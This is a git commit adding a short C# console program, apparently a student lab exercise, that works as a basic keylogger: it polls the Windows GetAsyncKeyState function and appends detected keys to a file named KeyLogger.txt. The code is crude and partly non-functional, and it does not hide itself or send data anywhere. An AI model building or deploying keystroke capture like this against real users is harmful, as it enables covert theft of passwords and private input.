aebee4ce117f4f778cdaaf1f359031d7b7688580
Oleg140 <79318243+Oleg140@users.noreply.github.com>
2021-05-14 18:40:55 +0300

    Add files via upload

---
+++ Lab4zad1/Lab4zad1/Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+
+namespace Lab4zad1
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int64 i);
+
+        static void Main()
+        {
+
+            while (true)
+            {
+
+                StreamWriter File = new StreamWriter("KeyLogger.txt", true);
+                char Key = ' ';
+                for (int i = 0; i < 100; i++)
+                {
+                    if (GetAsyncKeyState(i) != 0)
+                    {
+                        Key = Convert.ToChar(i);
+                    }
+                }
+                File.Write(Key);
+                Console.ReadKey();
+                File.Close();
+            }
+        }
+    }
+}
